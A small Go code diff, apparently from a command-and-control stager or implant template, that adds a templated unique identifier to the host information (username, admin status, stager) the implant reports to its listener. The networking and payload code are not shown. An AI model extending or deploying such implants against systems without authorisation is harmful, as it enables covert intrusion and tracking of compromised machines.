@@ -27,6 +27,7 @@ const (
 	LISTENER_IP   string = "{{stager.listener.address}}"
 	LISTENER_PORT string = "{{stager.listener.port}}"
 	SSL           string = "{{stager.listener.ssl | lower}}"
+	UID		      string = "{{identifier.uid}}"
 )
 
 var (
@@ -138,6 +139,7 @@ func system_info() []byte {
 		"user":         username,
 		"admin":        false,
 		"stager":       STAGER,
+		"uid":          UID,
 	})
 
 	return data
